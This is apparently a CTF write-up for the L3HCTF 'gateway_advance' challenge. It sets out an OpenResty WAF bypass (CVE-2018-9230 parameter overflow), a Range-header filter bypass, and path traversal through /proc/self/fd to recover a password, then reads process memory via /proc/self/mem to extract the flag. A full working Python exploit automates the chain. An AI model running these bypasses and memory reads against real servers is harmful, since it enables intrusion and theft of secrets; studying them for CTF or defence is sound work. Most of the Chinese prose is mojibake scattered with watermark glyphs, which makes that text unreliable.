<h1 id="3-gateway-advance"><a href="#3-gateway-advance" class="headerlink" title="3. gateway_advance"></a>3. gateway_advance</h1><h2 id="3-1-OpenResty-å‚æ•°æº¢å‡ºæ¼æ´"><a href="#3-1-OpenResty-å‚æ•°æº¢å‡ºæ¼æ´" class="headerlink" title="3.1 OpenResty å‚æ•°æº¢å‡ºæ¼æ´"></a>3.1 OpenResty å‚æ•°æº¢å‡ºæ¼æ´</h2><p>CVE-2018-9230ï¼Œå‚è€ƒï¼š <a href="https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md">https://github.com/Bypass007/vuln/blob<span class="hexo-wm">ğ’”â€Â³ğ˜·ğğ’Â·ï»¿ï»¿Ñ•ğ˜ªâ€Œâ€‹ğ’•ï½…â€Œ</span>/master/OpenResty/OpenResty%20uriå‚æ•°æº¢å‡ºæ¼æ´.md</a></p>
<blockquote>
<p>OpenResty é€šè¿‡ ngx.req.get_uri_argsã€ngx.req.get_post_args <span class="hexo-wm">ğ˜´ï»¿â€‹Â³â…´ğ˜¦ğ’ï¼â€Œï»¿ğ’”ğ˜ªï»¿tğâ€‹</span>è·å–å‚æ•°æ—¶ï¼Œåªèƒ½è·å–åˆ°å‰100ä¸ªå‚æ•°ï¼Œå½“æäº¤ç¬¬101ä¸ªå‚æ•°æ—¶ï¼Œuri å‚æ•°æº¢å‡ºï¼Œæ— æ³•æ­£ç¡®è·å–åˆ°ç¬¬101ä¸ªåŠä»¥åçš„å‚æ•°ï¼Œæ— æ³•å¯¹æ”»å‡»è€…æäº¤çš„æ”»å‡»è¯­å¥è¿›è¡Œå®‰å…¨æ£€æµ‹ï¼Œå¯¼è‡´åŸºäº ngx_lua <span class="hexo-wm">ğ’”â€‹ï»¿Â³ğ˜·ğï½Â·ï»¿â€Ñ•ğ˜ªï»¿ï»¿ğ­ğâ€‹â€</span>å¼€å‘çš„å®‰å…¨é˜²æŠ¤å¯è¢«ç»•è¿‡ï¼Œå½±å“å¤šæ¬¾åŸºäº OpenResty çš„å¼€æºWAF</p>
</blockquote>
<pre class="language-lua" data-language="lua"><code class="language-lua">location <span class="token operator">/</span><span class="token function">download</span> <span class="token punctuation">{</span>
    <span class="token function">access_by_lua_block</span> <span class="token punctuation">{</span>
        <span class="token keyword">local</span> blacklist <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"%."</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">";"</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"proc"</span><span class="token punctuation">}</span>
        <span class="token keyword">local</span> args <span class="token operator">=</span> ngx<span class="token punctuation">.</span>req<span class="token punctuation">.</span><span class="token function">get_uri_args</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> <span class="token function">pairs</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token keyword">do</span>
            <span class="token keyword">for</span> _<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span> <span class="token keyword">do</span>
                <span class="token keyword">if</span> string<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token keyword">then</span>
                    ngx<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>
                <span class="token keyword">end</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
    <span class="token punctuation">}</span>
    add_header Content<span class="token operator">-</span>Disposition <span class="token string">"attachment; filename=download.txt"</span><span class="token punctuation">;</span>
    proxy_pass http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">/</span>static$arg_filename<span class="token punctuation">;</span>
    <span class="token function">body_filter_by_lua_block</span> <span class="token punctuation">{</span>
        <span class="token keyword">local</span> blacklist <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"l3hsec"</span><span class="token punctuation">,</span> <span class="token string">"l3hctf"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">,</span> <span class="token string">"confidential"</span><span class="token punctuation">}</span>
        <span class="token keyword">for</span> _<span class="token punctuation">,</span> b <span class="token keyword">in</span> <span class="token function">ipairs</span><span class="token punctuation">(</span>blacklist<span class="token punctuation">)</span> <span class="token keyword">do</span>
            <span class="token keyword">if</span> string<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span>ngx<span class="token punctuation">.</span>arg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token keyword">then</span>
                ngx<span class="token punctuation">.</span>arg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">rep</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> string<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span>ngx<span class="token punctuation">.</span>arg<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">end</span>
        <span class="token keyword">end</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>æ­¤å¤„ <code>/download</code> è·¯ç”±é¦–å…ˆä½¿ç”¨ <code>ngx.req.get_uri_args</code> è·å–è¯·æ±‚å‚æ•°ï¼Œå¹¶ä½¿ç”¨é»‘åå•è¿‡æ»¤å‚æ•°å†…å®¹ï¼Œç”±äºå­˜åœ¨å‚æ•°æº¢å‡ºæ¼æ´ï¼Œé€šè¿‡æ„é€ 100ä¸ªæ— ç”¨çš„dummyå‚æ•°ï¼Œå¹¶åœ¨101ä¸ªå‚æ•°ä¸­ä¼ å…¥ filename å³å¯ç»•è¿‡</p>
<h2 id="3-2-Range-å¤´ç»•è¿‡-WAF"><a href="#3-2-Range-å¤´ç»•è¿‡-WAF" class="headerlink" title="3.2 Range å¤´ç»•è¿‡ WAF"></a>3.2 Range å¤´ç»•è¿‡ WAF</h2><blockquote>
<p>HTTP è¯·æ±‚ä¸­çš„ Range <span class="hexo-wm">ğ˜€â€â€‹3vï½…nâ€¢â€sï½‰â€â€ğ’•ğ˜¦â€‹</span>å¤´å¯ä»¥æ§åˆ¶æ¯æ¬¡è¿”å›çš„æ•°æ®èŒƒå›´ï¼Œ<span class="hexo-wm">ğ’”â€ï»¿ğŸ¯veğ’Â·â€ŒÑ•iâ€‹ï»¿ğ’•ğâ€‹â€</span>å®ç°æ•°æ®åˆ†æ®µä¼ è¾“å’Œæ–­ç‚¹ç»­ä¼ </p>
</blockquote>
<p><code>/download</code> è·¯ç”±ä¸­è¿˜å­˜åœ¨å¯¹ body å†…å®¹çš„è¿‡æ»¤ï¼Œä¼šå°† body ä¸­çš„é»‘åå•å­—ç¬¦è½¬æ¢ä¸º <code>*</code>ï¼Œå¯ä»¥é€šè¿‡ Range header æŒ‰ç…§å›ºå®šæ­¥é•¿åˆ†æ®µè¯»å–è¿”å›çš„ä¿¡æ¯æ¥ç»•è¿‡è¿‡æ»¤è·å¾—å®Œæ•´çš„è¿”å›å†…å®¹ï¼š<code>Range: bytes={off}-{off+RANGE_STEP-1}</code></p>
<h2 id="3-3-download-è·¯ç”±-fd-è¯»-password"><a href="#3-3-download-è·¯ç”±-fd-è¯»-password" class="headerlink" title="3.3 download è·¯ç”± fd è¯» password"></a>3.3 download è·¯ç”± fd è¯» password</h2><pre class="language-lua" data-language="lua"><code class="language-lua"><span class="token function">init_by_lua_block</span> <span class="token punctuation">{</span>
    f <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    f2 <span class="token operator">=</span> io<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> f<span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">"*all"</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> f2<span class="token punctuation">:</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token string">"*all"</span><span class="token punctuation">)</span>
    f<span class="token punctuation">:</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    password <span class="token operator">=</span> string<span class="token punctuation">.</span><span class="token function">gsub</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token string">"[\n\r]"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>
    os<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"/password"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span></code></pre>
<p>æ³¨æ„åˆ°åˆå§‹åŒ–æ—¶åªå…³é—­äº† /flag çš„ Lua æ–‡ä»¶å¥æŸ„ï¼Œæ²¡æœ‰å…³é—­ /password çš„ï¼Œå› æ­¤è¿›ç¨‹ä¾ç„¶å ç€ä¸€ä¸ªæŒ‡å‘åŸ inode çš„ fdï¼Œ å°±å¯ä»¥é€šè¿‡æšä¸¾ <code>/proc/self/fd/{id}</code> è¯»å‡º pas<span class="hexo-wm">ğ’”ï»¿ï»¿â‘¶â…´ğï½Â·â€Œğ¬iâ€â€ğ’•ğâ€â€‹</span>sword å†…å®¹</p>
<h2 id="3-4-read-anywhere-è·¯ç”±è¯»å†…å­˜-flag"><a href="#3-4-read-anywhere-è·¯ç”±è¯»å†…å­˜-flag" class="headerlink" title="3.4 read_anywhere è·¯ç”±è¯»å†…å­˜ flag"></a>3.4 read_anywhere è·¯ç”±è¯»å†…å­˜ flag</h2><p>è·å–åˆ° password å†…å®¹åå¯ä»¥ä» /read_anywhere è·¯ç”±æŒ‡å®šåç§»è®¿é—®æ–‡ä»¶</p>
<p>é¦–å…ˆè¯»å– <code>/proc/self/maps</code> æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„<span class="hexo-wm">ğ˜´â€‹Â³veï½.â€ğ˜´ğ˜ªâ€â€ï½”â„®â€ï»¿</span>æ•°æ®å†…å®¹çš„å†…å­˜åç§»</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">5a9b0bacd000-5a9b0bb11000 r--p 00000000 00:39 <span class="token number">923945</span>                     /usr/local/openresty/nginx/sbin/nginx
5a9b0bb11000-5a9b0bc89000 r-xp 00044000 00:39 <span class="token number">923945</span>                     /usr/local/openresty/nginx/sbin/nginx
5a9b0bc89000-5a9b0bcf1000 r--p 001bc000 00:39 <span class="token number">923945</span>                     /usr/local/openresty/nginx/sbin/nginx
5a9b0bcf1000-5a9b0bcf4000 r--p 00224000 00:39 <span class="token number">923945</span>                     /usr/local/openresty/nginx/sbin/nginx
5a9b0bcf4000-5a9b0bd19000 rw-p 00227000 00:39 <span class="token number">923945</span>                     /usr/local/openresty/nginx/sbin/nginx
5a9b0bd19000-5a9b0bdea000 rw-p 00000000 00:00 <span class="token number">0</span>
5a9b1bc28000-5a9b1bc29000 ---p 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
5a9b1bc29000-5a9b1bc2e000 rw-p 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
703854f60000-703854f70000 r-xp 00000000 00:00 <span class="token number">0</span>
70386bd0d000-70386c26d000 rw-p 00000000 00:00 <span class="token number">0</span>
70386c2e8000-70386c3d9000 rw-p 00000000 00:00 <span class="token number">0</span>
70386c3d9000-70386c3da000 rw-s 00000000 00:01 <span class="token number">3107</span>                       /dev/zero <span class="token punctuation">(</span>deleted<span class="token punctuation">)</span>
70386c3da000-70386c513000 rw-p 00000000 00:00 <span class="token number">0</span>
70386c51a000-70386c51c000 rw-p 00000000 00:00 <span class="token number">0</span>
70386c51c000-70386c56b000 rw-p 00000000 00:00 <span class="token number">0</span>
70386c56b000-70386c56f000 r--p 00000000 00:39 <span class="token number">923700</span>                     /usr/lib/libgcc_s.so.1
70386c56f000-70386c591000 r-xp 00004000 00:39 <span class="token number">923700</span>                     /usr/lib/libgcc_s.so.1
70386c591000-70386c595000 r--p 00026000 00:39 <span class="token number">923700</span>                     /usr/lib/libgcc_s.so.1
70386c595000-70386c596000 r--p 00029000 00:39 <span class="token number">923700</span>                     /usr/lib/libgcc_s.so.1
70386c596000-70386c597000 rw-p 0002a000 00:39 <span class="token number">923700</span>                     /usr/lib/libgcc_s.so.1
70386c597000-70386c59a000 r--p 00000000 00:39 <span class="token number">923379</span>                     /usr/lib/libz.so.1.3.1
70386c59a000-70386c5a9000 r-xp 00003000 00:39 <span class="token number">923379</span>                     /usr/lib/libz.so.1.3.1
70386c5a9000-70386c5b0000 r--p 00012000 00:39 <span class="token number">923379</span>                     /usr/lib/libz.so.1.3.1
70386c5b0000-70386c5b1000 r--p 00018000 00:39 <span class="token number">923379</span>                     /usr/lib/libz.so.1.3.1
70386c5b1000-70386c5b2000 rw-p 00019000 00:39 <span class="token number">923379</span>                     /usr/lib/libz.so.1.3.1
70386c5b2000-70386c675000 r--p 00000000 00:39 <span class="token number">924105</span>                     /usr/local/openresty/openssl3/lib/libcrypto.so.3
70386c675000-70386c9cd000 r-xp 000c3000 00:39 <span class="token number">924105</span>                     /usr/local/openresty/openssl3/lib/libcrypto.so.3
70386c9cd000-70386cae9000 r--p 0041b000 00:39 <span class="token number">924105</span>                     /usr/local/openresty/openssl3/lib/libcrypto.so.3
70386cae9000-70386cb4e000 r--p 00537000 00:39 <span class="token number">924105</span>                     /usr/local/openresty/openssl3/lib/libcrypto.so.3
70386cb4e000-70386cb51000 rw-p 0059c000 00:39 <span class="token number">924105</span>                     /usr/local/openresty/openssl3/lib/libcrypto.so.3
70386cb51000-70386cb54000 rw-p 00000000 00:00 <span class="token number">0</span>
70386cb54000-70386cb78000 r--p 00000000 00:39 <span class="token number">924108</span>                     /usr/local/openresty/openssl3/lib/libssl.so.3
70386cb78000-70386cc20000 r-xp 00024000 00:39 <span class="token number">924108</span>                     /usr/local/openresty/openssl3/lib/libssl.so.3
70386cc20000-70386cc53000 r--p 000cc000 00:39 <span class="token number">924108</span>                     /usr/local/openresty/openssl3/lib/libssl.so.3
70386cc53000-70386cc5e000 r--p 000ff000 00:39 <span class="token number">924108</span>                     /usr/local/openresty/openssl3/lib/libssl.so.3
70386cc5e000-70386cc62000 rw-p 0010a000 00:39 <span class="token number">924108</span>                     /usr/local/openresty/openssl3/lib/libssl.so.3
70386cc62000-70386cc65000 r--p 00000000 00:39 <span class="token number">924135</span>                     /usr/local/openresty/pcre2/lib/libpcre2-8.so.0.13.0
70386cc65000-70386cce1000 r-xp 00003000 00:39 <span class="token number">924135</span>                     /usr/local/openresty/pcre2/lib/libpcre2-8.so.0.13.0
70386cce1000-70386cd0f000 r--p 0007f000 00:39 <span class="token number">924135</span>                     /usr/local/openresty/pcre2/lib/libpcre2-8.so.0.13.0
70386cd0f000-70386cd10000 r--p 000ac000 00:39 <span class="token number">924135</span>                     /usr/local/openresty/pcre2/lib/libpcre2-8.so.0.13.0
70386cd10000-70386cd11000 rw-p 000ad000 00:39 <span class="token number">924135</span>                     /usr/local/openresty/pcre2/lib/libpcre2-8.so.0.13.0
70386cd11000-70386cd1a000 r--p 00000000 00:39 <span class="token number">923808</span>                     /usr/local/openresty/luajit/lib/libluajit-5.1.so.2.1.ROLLING    
70386cd1a000-70386cd87000 r-xp 00009000 00:39 <span class="token number">923808</span>                     /usr/local/openresty/luajit/lib/libluajit-5.1.so.2.1.ROLLING    
70386cd87000-70386cd9f000 r--p 00076000 00:39 <span class="token number">923808</span>                     /usr/local/openresty/luajit/lib/libluajit-5.1.so.2.1.ROLLING    
70386cd9f000-70386cda2000 r--p 0008e000 00:39 <span class="token number">923808</span>                     /usr/local/openresty/luajit/lib/libluajit-5.1.so.2.1.ROLLING    
70386cda2000-70386cda3000 rw-p 00091000 00:39 <span class="token number">923808</span>                     /usr/local/openresty/luajit/lib/libluajit-5.1.so.2.1.ROLLING    
70386cda3000-70386cdb7000 r--p 00000000 00:39 <span class="token number">923145</span>                     /lib/ld-musl-x86_64.so.1
70386cdb7000-70386ce0e000 r-xp 00014000 00:39 <span class="token number">923145</span>                     /lib/ld-musl-x86_64.so.1
70386ce0e000-70386ce44000 r--p 0006b000 00:39 <span class="token number">923145</span>                     /lib/ld-musl-x86_64.so.1
70386ce44000-70386ce45000 r--p 000a0000 00:39 <span class="token number">923145</span>                     /lib/ld-musl-x86_64.so.1
70386ce45000-70386ce46000 rw-p 000a1000 00:39 <span class="token number">923145</span>                     /lib/ld-musl-x86_64.so.1
70386ce46000-70386ce49000 rw-p 00000000 00:00 <span class="token number">0</span>
7ffe446a3000-7ffe446c4000 rw-p 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>stack<span class="token punctuation">]</span>
7ffe4476e000-7ffe44772000 r--p 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>vvar<span class="token punctuation">]</span>
7ffe44772000-7ffe44774000 r-xp 00000000 00:00 <span class="token number">0</span>                          <span class="token punctuation">[</span>vdso<span class="token punctuation">]</span>
ffffffffff600000-ffffffffff601000 <span class="token parameter variable">--xp</span> 00000000 00:00 <span class="token number">0</span>                  <span class="token punctuation">[</span>vsyscall<span class="token punctuation">]</span></code></pre>

<p>æ¥ç€è¯»å– <code>/proc/self/mem</code> å¹¶ä¼ å…¥å¯¹åº”çš„å†…å­˜åç§»å³å¯<span class="hexo-wm">Ñ•â€‹3ğ˜·ğï½âˆ™â€Œğ˜€â…ˆâ€‹ğ˜µğ˜¦â€Œ</span>ä»ä¸­è·å¾— flag</p>
<p>Expï¼š</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> re<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">as</span> u

RANGE_STEP <span class="token operator">=</span> <span class="token number">1</span>
BASE <span class="token operator">=</span> <span class="token string">"http://ip:port"</span>

<span class="token comment"># --- /download è·¯ç”±è¯»å– password -----------------------------</span>
<span class="token keyword">def</span> <span class="token function">fetch</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> off<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    qs <span class="token operator">=</span> <span class="token string">'&amp;'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'x</span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">=0'</span></span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment"># 100 dummy å‚æ•°ç»•è¿‡ ngx.req.get_uri_args é™åˆ¶</span>
    qs <span class="token operator">+=</span> <span class="token string">'&amp;filename='</span> <span class="token operator">+</span> u<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>path<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token string">'/'</span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>BASE<span class="token punctuation">}</span></span><span class="token string">/download?</span><span class="token interpolation"><span class="token punctuation">{</span>qs<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'Range'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'bytes=</span><span class="token interpolation"><span class="token punctuation">{</span>off<span class="token punctuation">}</span></span><span class="token string">-</span><span class="token interpolation"><span class="token punctuation">{</span>off<span class="token operator">+</span>RANGE_STEP<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> r

<span class="token keyword">def</span> <span class="token function">read_small</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> limit<span class="token operator">=</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Testingï¼š</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    r <span class="token operator">=</span> fetch<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>                                <span class="token comment"># æ¢æµ‹ç¬¬ 0 å­—èŠ‚</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">206</span> <span class="token keyword">or</span> <span class="token keyword">not</span> r<span class="token punctuation">.</span>content <span class="token keyword">or</span> r<span class="token punctuation">.</span>content <span class="token operator">==</span> <span class="token string">b'*'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">''</span>                                     <span class="token comment"># é 206ï¼ˆå« 500ï¼‰ç«‹å³æ”¾å¼ƒ</span>
    out <span class="token operator">=</span> r<span class="token punctuation">.</span>content <span class="token keyword">if</span> r<span class="token punctuation">.</span>content <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token string">b'\n\r'</span> <span class="token keyword">else</span> <span class="token string">b''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> limit<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Reading passwordï¼š</span><span class="token interpolation"><span class="token punctuation">{</span>out<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        c <span class="token operator">=</span> fetch<span class="token punctuation">(</span>path<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>content
        <span class="token keyword">if</span> <span class="token keyword">not</span> c <span class="token keyword">or</span> c <span class="token operator">==</span> <span class="token string">b'*'</span> <span class="token keyword">or</span> c <span class="token keyword">in</span> <span class="token string">b'\n\r'</span><span class="token punctuation">:</span> <span class="token keyword">break</span>
        out <span class="token operator">+=</span> c
    <span class="token keyword">return</span> out<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span>

<span class="token comment"># --- æšä¸¾ /proc/self/fd/n è¯»å– password ----------</span>
pwd <span class="token operator">=</span> <span class="token builtin">next</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>read_small<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'../proc/self/fd/</span><span class="token interpolation"><span class="token punctuation">{</span>n<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span> <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># pwd = "passwordismemeispasswordsoneverwannagiveyouup"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] password ='</span><span class="token punctuation">,</span> pwd<span class="token punctuation">)</span>

<span class="token comment"># --- /read_anywhere è¯»å– flag ----------------------</span>
<span class="token keyword">def</span> <span class="token function">r_any</span><span class="token punctuation">(</span>fname<span class="token punctuation">,</span> start<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">1048576</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    h <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'x-gateway-password'</span><span class="token punctuation">:</span> pwd<span class="token punctuation">,</span>
         <span class="token string">'x-gateway-filename'</span><span class="token punctuation">:</span> fname<span class="token punctuation">,</span>
         <span class="token string">'x-gateway-start'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>start<span class="token punctuation">)</span><span class="token punctuation">,</span>
         <span class="token string">'x-gateway-length'</span><span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">}</span>
    <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>BASE<span class="token punctuation">}</span></span><span class="token string">/read_anywhere'</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span>h<span class="token punctuation">)</span><span class="token punctuation">.</span>content

<span class="token comment"># --- è§£æ /proc/self/maps æ‹¿ flag åç§» ---------------------</span>
maps <span class="token operator">=</span> r_any<span class="token punctuation">(</span><span class="token string">'/proc/self/maps'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">65536</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
ranges <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> line <span class="token keyword">in</span> maps<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parts <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment"># æŒ‰ç©ºç™½åˆ†åˆ—</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parts<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>                 <span class="token comment"># æ„å¤–çŸ­è¡Œï¼Œè·³è¿‡</span>
        <span class="token keyword">continue</span>
    addr<span class="token punctuation">,</span> perms <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    path <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>parts<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> <span class="token number">6</span> <span class="token keyword">else</span> <span class="token string">''</span>   <span class="token comment"># è¡Œå°¾å¯èƒ½æ²¡æœ‰ pathname</span>
    <span class="token keyword">if</span> perms<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'rw'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token keyword">not</span> path <span class="token keyword">or</span> <span class="token string">'(deleted)'</span> <span class="token keyword">in</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        start<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> addr<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'-'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        ranges<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># --- è¯»å– flag ----------------------------</span>
<span class="token keyword">for</span> start<span class="token punctuation">,</span> end <span class="token keyword">in</span> ranges<span class="token punctuation">:</span>
    chunk <span class="token operator">=</span> r_any<span class="token punctuation">(</span><span class="token string">'/proc/self/mem'</span><span class="token punctuation">,</span> start<span class="token punctuation">,</span> end<span class="token operator">-</span>start<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">rb"L3HCTF{.*?}"</span><span class="token punctuation">,</span> chunk<span class="token punctuation">)</span>
    <span class="token keyword">if</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+] flag  ='</span><span class="token punctuation">,</span> flag<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre>

